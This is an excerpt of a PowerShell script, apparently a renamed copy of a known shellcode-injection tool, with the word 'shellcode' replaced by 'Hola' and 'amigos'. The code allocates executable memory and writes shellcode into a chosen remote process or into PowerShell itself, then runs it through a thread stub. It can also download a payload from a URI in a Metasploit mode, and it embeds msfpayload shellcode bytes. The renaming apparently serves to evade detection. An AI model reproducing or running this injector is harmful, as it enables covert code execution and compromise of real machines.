...
[CmdletBinding( DefaultParameterSetName = 'RunLocal', SupportsShouldProcess = $True , ConfirmImpact = 'High')] Param (
    ...
    {
        $AvailablePayloads = (Get-Command Invoke-Adios).Parameters['Payload'].Attributes |
    ...
    # Emits a amigos stub that when injected will create a thread and pass execution to the main amigos payload
    function Local:Emit-CallThreadStub ([IntPtr] $BaseAddr, [IntPtr] $ExitThreadAddr, [Int] $Architecture)
    {
        ...
        if ($IntSizePtr -eq 8)
        {
            [Byte[]] $CallStub = 0x48,0xB8                      # MOV   QWORD RAX, &amigos
            $CallStub += ConvertTo-LittleEndian $BaseAddr       # &amigos
        ...
        {
            [Byte[]] $CallStub = 0xB8                           # MOV   DWORD EAX, &amigos
            $CallStub += ConvertTo-LittleEndian $BaseAddr       # &amigos
    ...
    function Local:Inject-RemoteHola ([Int] $ProcessID)
    {
        ...
        if ($64bitCPU) # Only perform theses checks if CPU is 64-bit
        {
            ...
            {
                Throw 'Unable to inject 64-bit amigos from within 32-bit Powershell. Use the 64-bit version of Powershell if you want this to work.'
            }
            elseif ($IsWow64) # 32-bit Wow64 process
            {
                if ($Hola32.Length -eq 0)
                {
                    Throw 'No amigos was placed in the $Hola32 variable!'
                }
                
                $Hola = $Hola32
                Write-Verbose 'Injecting into a Wow64 process.'
                Write-Verbose 'Using 32-bit amigos.'
            }
            else # 64-bit process
            {
                if ($Hola64.Length -eq 0)
                {
                    Throw 'No amigos was placed in the $Hola64 variable!'
                }
                
                $Hola = $Hola64
                Write-Verbose 'Using 64-bit amigos.'
            }
        }
        else # 32-bit CPU
        {
        ...
        # Reserve and commit enough memory in remote process to hold the amigos
        $RemoteMemAddr = $VirtualAllocEx.Invoke($hProcess, [IntPtr]::Zero, $Hola.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RWX)
        
        if (!$RemoteMemAddr)
        {
            Throw "Unable to allocate amigos memory in PID: $ProcessID"
        }
        
        Write-Verbose "Hola memory reserved at 0x$($RemoteMemAddr.ToString("X$([IntPtr]::Size*2)"))"

        # Copy amigos into the previously allocated memory
        $WriteProcessMemory.Invoke($hProcess, $RemoteMemAddr, $Hola, $Hola.Length, [Ref] 0) | Out-Null
        ...
        if ($IsWow64)
        {
            # Build 32-bit inline assembly stub to call the amigos upon creation of a remote thread.
        ...
        {
            # Build 64-bit inline assembly stub to call the amigos upon creation of a remote thread.
        ...
        # Execute amigos as a remote thread
        ...
        Write-Verbose 'Hola injection complete!'
    }

    function Local:Inject-LocalHola
    {
        if ($PowerShell32bit) {
            if ($Hola32.Length -eq 0)
            {
        ...
        # Allocate RWX memory for the amigos
        $BaseAddress = $VirtualAlloc.Invoke([IntPtr]::Zero, $Hola.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RWX)
        if (!$BaseAddress)
        {
            Throw "Unable to allocate amigos memory in PID: $ProcessID"
        }
        
        Write-Verbose "Hola memory reserved at 0x$($BaseAddress.ToString("X$([IntPtr]::Size*2)"))"

        # Copy amigos to RWX buffer
        [System.Runtime.InteropServices.Marshal]::Copy($Hola, 0, $BaseAddress, $Hola.Length)
        ...
        # Launch amigos in it's own thread
        ...
        # Wait for amigos thread to terminate
        $WaitForSingleObject.Invoke($ThreadHandle, 0xFFFFFFFF) | Out-Null
        
        $VirtualFree.Invoke($CallStubAddress, $CallStub.Length + 1, 0x8000) | Out-Null # MEM_RELEASE (0x8000)
        $VirtualFree.Invoke($BaseAddress, $Hola.Length + 1, 0x8000) | Out-Null # MEM_RELEASE (0x8000)
    ...
    if ($PsCmdlet.ParameterSetName -eq 'Metasploit')
    {
        if (!$PowerShell32bit) {
            ...
            if ( $Force -or ( $Response = $psCmdlet.ShouldContinue( "Do you want to launch the payload from x86 Powershell?",
                   "Attempt to execute 32-bit amigos from 64-bit Powershell. Note: This process takes about one minute. Be patient! You will also see some artifacts of the script loading in the other process." ) ) ) { }
            ...
            # Since the amigos will run in a noninteractive instance of PowerShell, make sure the -Force switch is included so that there is no warning prompt.
            ...
            # Exit the script since the amigos will be running from x86 PowerShell
            Return
        }
        ...
        try
        {
            [Byte[]] $Hola32 = $WebClient.DownloadData($Uri)
        }
        catch
        {
    ...
    elseif ($PSBoundParameters['Hola'])
    {
        # Users passing in amigos  through the '-Hola' parameter are responsible for ensuring it targets
    ...
    {
        # Pop a calc... or whatever amigos you decide to place in here
        # I sincerely hope you trust that this amigos actually pops a calc...
        # Insert your amigos here in the for 0xXX,0xXX,...
        # 32-bit payload
        # msfpayload windows/exec CMD="cmd /k calc" EXITFUNC=thread
        [Byte[]] $Hola32 = @(0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,
        ...
        [Byte[]] $Hola64 = @(0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,
    ...
    if ( $PSBoundParameters['ProcessID'] )
    {
        # Inject amigos into the specified process ID
        ...
        Write-Verbose "Injecting amigos into PID: $ProcessId"
        
        if ( $Force -or $psCmdlet.ShouldContinue( 'Do you wish to carry out your evil plans?',
                 "Injecting amigos injecting into $((Get-Process -Id $ProcessId).ProcessName) ($ProcessId)!" ) )
        {
            Inject-RemoteHola $ProcessId
        }
    }
    else
    {
        # Inject amigos into the currently running PowerShell process
        ...
        Write-Verbose "Injecting amigos into PowerShell"
        
        if ( $Force -or $psCmdlet.ShouldContinue( 'Do you wish to carry out your evil plans?',
                 "Injecting amigos into the running PowerShell process!" ) )
        {
            Inject-LocalHola
        }
    }   
